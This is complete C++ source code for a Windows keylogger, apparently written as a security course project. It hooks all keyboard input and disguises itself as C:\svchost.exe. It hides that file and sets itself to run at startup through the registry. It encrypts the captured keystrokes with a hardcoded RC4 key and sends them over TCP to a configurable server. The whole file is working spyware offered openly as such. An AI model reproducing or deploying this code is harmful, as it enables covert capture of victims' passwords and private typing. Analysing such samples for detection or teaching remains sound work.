// Version of Windows, 0x501 means WINXP
#define _WIN32_WINNT 0x501
#include <windows.h>
#include <winbase.h>
#include <winuser.h>
#include <winreg.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <cstdio>
#include <vector>
#include <algorithm>

using namespace std;

#define SEC_PATH "C:\\svchost.exe"

const int BUF_SIZE = 500;
const char *SEC_IP = "localhost";  // server IP
const char *SEC_PORT = "2000";  // server port
const char *COPY_DST = SEC_PATH;
const unsigned char EXE_PATH[] = SEC_PATH;

#pragma comment(lib,"Ws2_32.lib")

// -- RC4 -- //
const char *KEY = "hackerneverdie";
unsigned char S[256], PRGAi, PRGAj;
void KSA(const char *key, int keylen)
{
	for (int i=0; i<256; ++i)
		S[i] = i;

	for (int i=0, j=0; i<256; ++i) {
		j = (j + S[i] + key[i%keylen]) % 256;
        std::swap(S[i], S[j]);
	}
	PRGAi = PRGAj = 0;
}
void PRG_init()
{
    KSA(KEY, strlen(KEY));
}
unsigned char PRGA()
{
	PRGAi = (PRGAi + 1) % 256;
	PRGAj = (PRGAj + S[PRGAi]) % 256;
    std::swap(S[PRGAi], S[PRGAj]);
    return S[(S[PRGAi] + S[PRGAj]) % 256];
}

void encrypt_string(char *str, int len)
{
    for (int i=0; i<len; ++i) {
        str[i] = str[i] ^ PRGA();
    }
}
// -- RC4 -- //

// -- Buffer -- //
HANDLE bfMutex;
std::vector<char> sharedBuffer;
std::vector<char> outputBuffer;

// mutex locker for buffer
class lock {
    public:
        lock() {
            WaitForSingleObject(bfMutex, INFINITE);
        }
        ~lock() {
            if (!ReleaseMutex(bfMutex)) {
                // Handle error.
            }
        }
};

void write_buffer(char ch)
{
    lock scopeLock;
    sharedBuffer.push_back(ch);
}
void read_buffer()
{
    if (sharedBuffer.size() > 0) {
        lock scopeLock;
        outputBuffer = sharedBuffer;
        sharedBuffer.clear();
    }
}
// -- Buffer -- //

// -- Single -- //
class SingleProcess {
    protected:
        bool  another;
        HANDLE mutex;

    public:
        SingleProcess(const char *name)
        {
            mutex = CreateMutex(NULL, FALSE, name);
            another = GetLastError() == ERROR_ALREADY_EXISTS;
        }
        ~SingleProcess()
        {
            if (mutex) {
                CloseHandle(mutex);
            }
        }
        bool isAnother()
        {
            return another;
        }
};
// -- Single -- //

// -- Key Logger -- //
bool isShiftDown()
{
    // the most significant bit is set if the key is down
    return GetAsyncKeyState(VK_SHIFT) & 0x8000;
}
bool isLowerCase()
{
    // the least significant bit is set if the key is toggled
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) == 0x0001;
    bool sht = isShiftDown();
    return (caps && sht) || (!caps && !sht);
}
char getKey(DWORD);

LRESULT WINAPI Handle(int code, WPARAM w, LPARAM l)
{
    // capture the event `key pressed down'
    if (w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbhook = (KBDLLHOOKSTRUCT *) l;
        char key = getKey(kbhook->vkCode);
        if (key) {
            write_buffer(key);
        }
    }
    return CallNextHookEx(NULL, code, w, l);
}
// -- Key Logger -- //


// -- Clinet -- //
// the socket to connect with server
SOCKET clientSocket;

bool open_socket()
{
    int iResult;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;  // Use IPv4
    hints.ai_socktype = SOCK_STREAM;  // Sequenced, reliable, two-way connection
    hints.ai_protocol = IPPROTO_TCP;  // Use TCP protocol

    printf("Obtaining the server address...\n");
    iResult = getaddrinfo(SEC_IP, SEC_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed: %d\n", iResult);
        return false;
    }

    printf("Creating a SOCKET for connection with server...\n");
    clientSocket = INVALID_SOCKET;
    ptr = result;
    clientSocket = socket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);

    if (clientSocket == INVALID_SOCKET) {
        printf("cannot open socket: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        return false;
    }

    printf("Connecting to the server...\n");
    iResult = connect(clientSocket, ptr->ai_addr,
            (int)ptr->ai_addrlen);

    if (iResult == SOCKET_ERROR) {
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);
    ptr = NULL;

    if (clientSocket == INVALID_SOCKET) {
        printf("Unable to connect to the server!\n");
        return false;
    }

    // Succeed
    return true;
}

DWORD WINAPI sec_send(LPVOID)
{
    int iResult;
    while (true) {
        int it = 0, msgLen = 0;
        char *sendBuf = NULL;
        if (open_socket()) {
            PRG_init();  // initialize PRG on every new connection

            // re-encrypt if error happened
            if (it < msgLen) {
                printf("Re-encrypting data...\n");

                // copy unencrypted data
                std::copy(outputBuffer.begin()+it, outputBuffer.end(), sendBuf+it);

                // encrypt it
                encrypt_string(sendBuf+it, msgLen-it);
            }

            printf("Sending data to server...\n");
            bool conn_error = false;
            while (!conn_error) {
                if (it < msgLen) {
                    iResult = send(clientSocket, sendBuf+it, msgLen-it, 0);
                    if (iResult == SOCKET_ERROR) {
                        printf("send failed: %d\n", WSAGetLastError());
                        closesocket(clientSocket);

                        conn_error = true;
                    } else {
                        it += iResult;  // advance the cursor
                    }
                } else {
                    // clear up buffer
                    if (sendBuf) {
                        delete [] sendBuf;
                        sendBuf = 0;
                        outputBuffer.clear();
                        it = 0;
                        msgLen = 0;
                    }

                    // wait for input
                    while (outputBuffer.size() == 0) {
                        Sleep(500);
                        read_buffer();
                    }

                    // copy the data
                    msgLen = outputBuffer.size();
                    sendBuf = new char[msgLen];
                    std::copy(outputBuffer.begin(), outputBuffer.end(), sendBuf);

                    // encrypt it
                    encrypt_string(sendBuf, msgLen);
                }
            }
        } else {
            // wait before next connection attempt
            Sleep(10000);
        }
    }

    printf("Shuting down sending connection...\n");
    iResult = shutdown(clientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown sending failed: %d\n", WSAGetLastError());
        closesocket(clientSocket);
        return 1;
    }

    printf("Closing...\n");
    closesocket(clientSocket);
    return 0;
}
// -- Client -- //


// -- Autorun -- //
bool setAutoRun()
{
    int iResult;
    char currentPath[BUF_SIZE];

    // Get current file name
    iResult = GetModuleFileName(NULL,
            currentPath,
            BUF_SIZE);
    if (iResult == 0) {
        printf("GetModuleFileName failed: %ld\n",
                GetLastError());
        return false;  // cannot setup auto run if failed
    }

    // install executable if newly executed
    if (strcmp(currentPath, COPY_DST) != 0) {

        WIN32_FIND_DATA FindFileData;
        HANDLE hFind;

        // See if a file already exists
        hFind = FindFirstFile(COPY_DST, &FindFileData);
        if (hFind != INVALID_HANDLE_VALUE) {
            FindClose(hFind);

            // set it to writable
            iResult = SetFileAttributes(COPY_DST,
                    FILE_ATTRIBUTE_NORMAL);
            if (iResult == 0) {
                printf("SetFileAttributes failed: %ld\n",
                        GetLastError());
            }

            // try delete the file
            iResult = DeleteFile(COPY_DST);
            if (iResult == 0) {
                printf("DeleteFile failed: %ld\n",
                        GetLastError());
            }
        }

        // copy the executable
        iResult = CopyFile(currentPath, COPY_DST, FALSE);
        if (iResult == 0) {
            printf("CopyFile failed: %ld\n",
                    GetLastError());
        }

        // hide it
        iResult = SetFileAttributes(COPY_DST,
                FILE_ATTRIBUTE_HIDDEN);
        if (iResult == 0) {
            printf("SetFileAttributes failed: %ld\n",
                    GetLastError());
        }

        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // execute the installed keylogger
        if (CreateProcess(COPY_DST,
                    NULL, NULL, NULL,
                    FALSE, 0, NULL, NULL,
                    &si, &pi))
        {
            // exits
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return true;
        }
        printf("CreateProcess failed!\n");
    }
    // continue if installation failed or if we are the installed keylogger

    // open registry for auto run
    HKEY hKey;
    iResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            KEY_SET_VALUE,
            &hKey);
    if (iResult != 0) {
        printf("RegOpenKeyEx failed: %d\n", iResult);
        return false;
    }

    // set up the auto run
    iResult = RegSetValueEx(hKey,
            "securitypj3",
            0,
            REG_SZ,
            EXE_PATH,
            sizeof(EXE_PATH)
            );
    if (iResult != 0) {
        printf("RegSetValueEx failed: %d\n", iResult);
    }

    RegCloseKey(hKey);

    return false;
}
// -- Autorun -- //


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR cmdLine, int cmdShow)
{
    // set up the auto run, and exit if a new process is created
    if (setAutoRun()) {
        return 0;
    }

    {
        // only a single keylogger can be executed
        SingleProcess sp("MYSINGLE-0000000-sec-pj3");
        if (sp.isAnother()) {
            printf("Already running!\n");
            return 1;
        }


        int iResult;
        printf("Initializing Winsock...\n");
        WSADATA wsdata;
        iResult = WSAStartup(MAKEWORD(2,2), &wsdata);
        if (iResult != 0) {
            printf("WSAStartup failed: %d\n", iResult);
            return 1;
        }

        // create mutex for sharedBuffer
        bfMutex = CreateMutex(NULL, FALSE, NULL);

        // hook keyboard event
        SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Handle, GetModuleHandle(NULL), 0);

        printf("Creating sending thread...\n");
        HANDLE thread;
        thread = CreateThread(NULL, 0, sec_send, NULL, 0, NULL);

        MSG msg;
        // dequeue the message queue
        while (GetMessage(&msg, NULL, 0, 0) != 0) {
            // Translates virtual-key messages into character messages.
            TranslateMessage(&msg);
            // Dispatches a message to a window procedure.
            DispatchMessage(&msg);
        }

        WaitForSingleObject(thread, INFINITE);
        WSACleanup();
        return 0;
    }
}

char getKey(DWORD vkCode)
{
    switch (vkCode) {
        case VK_SPACE:
            return ' ';
        case VK_NUMPAD0:
            return '0';
        case VK_NUMPAD1:
            return '1';
        case VK_NUMPAD2:
            return '2';
        case VK_NUMPAD3:
            return '3';
        case VK_NUMPAD4:
            return '4';
        case VK_NUMPAD5:
            return '5';
        case VK_NUMPAD6:
            return '6';
        case VK_NUMPAD7:
            return '7';
        case VK_NUMPAD8:
            return '8';
        case VK_NUMPAD9:
            return '9';
        case VK_MULTIPLY:
            return '*';
        case VK_ADD:
            return '+';
        case VK_SEPARATOR:
            return ',';
        case VK_SUBTRACT:
            return '-';
        case VK_DECIMAL:
            return '.';
        case VK_DIVIDE:
            return '/';
        default:
            if (vkCode >= '0' && vkCode <= '9') {
                // if 1~9 is pressed, check shift key
                const char syms[11] = ")!@#$%^&*(";
                if (isShiftDown()) {
                    return syms[vkCode-'0'];
                } else {
                    return vkCode;
                }
            } else if (vkCode >= 'A' && vkCode <= 'Z') {
                // check case if A~Z is pressed
                if (isLowerCase()) {
                    return vkCode-'A'+'a';
                } else {
                    return vkCode;
                }
            } else {
                // check if it's other symbol
                switch (vkCode) {
                    case VK_OEM_1:
                        return isShiftDown() ? ':' : ';';
                    case VK_OEM_PLUS:
                        return isShiftDown() ? '+' : '=';
                    case VK_OEM_COMMA:
                        return isShiftDown() ? '<' : ',';
                    case VK_OEM_MINUS:
                        return isShiftDown() ? '_' : '-';
                    case VK_OEM_PERIOD:
                        return isShiftDown() ? '>' : '.';
                    case VK_OEM_2:
                        return isShiftDown() ? '?' : '/';
                    case VK_OEM_3:
                        return isShiftDown() ? '~' : '`';
                    case VK_OEM_4:
                        return isShiftDown() ? '{' : '[';
                    case VK_OEM_5:
                        return isShiftDown() ? '|' : '\\';
                    case VK_OEM_6:
                        return isShiftDown() ? '}' : ']';
                    case VK_OEM_7:
                        return isShiftDown() ? '"' : '\'';
                    case VK_OEM_102:
                        return isShiftDown() ? '>' : '<';
                }
            }
    }
    // non-printable character
    return 0;
}
